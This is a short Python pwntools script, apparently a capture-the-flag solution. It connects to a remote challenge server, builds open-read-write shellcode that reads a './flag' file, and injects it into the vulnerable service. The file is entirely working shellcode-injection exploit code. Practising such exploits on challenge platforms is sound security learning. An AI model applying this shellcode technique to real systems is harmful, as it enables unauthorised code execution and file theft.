from pwn import *


p = remote("node4.buuoj.cn", 26726)


flag = 0x0804A128

# use orw shellcode
code = shellcraft.open("./flag")
code += shellcraft.read(3, flag, 0x50)
code += shellcraft.write(1, flag, 0x50)
code = asm(code)

p.send(code)

p.interactive()


